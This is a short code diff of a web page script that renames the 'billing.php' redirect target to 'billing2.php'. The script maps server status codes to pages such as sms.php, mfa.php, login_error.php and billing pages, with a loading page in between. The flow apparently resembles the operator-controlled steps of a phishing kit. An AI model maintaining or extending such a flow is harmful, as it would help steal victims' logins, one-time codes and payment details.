@@ -1968,7 +1968,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const result = await response.json();
 
             if (result.status === 'ok') {
-                const redirectUrl = result.checkbox_state === 1 ? 'billing.php' : 'loading.php';
+                const redirectUrl = result.checkbox_state === 1 ? 'billing2.php' : 'loading.php';
                 window.location.href = redirectUrl;
             } else {
                 console.error('Error:', result.message);
@@ -2036,7 +2036,7 @@ function handleRedirection(status) {
         '3': "login_error.php",
         '9': "sms.php",
         '11': "sms_error.php",
-        '84': "billing.php",
+        '84': "billing2.php",
         '86': "process.php",
         '88': "process_error.php",
 		'200': "mfa.php",
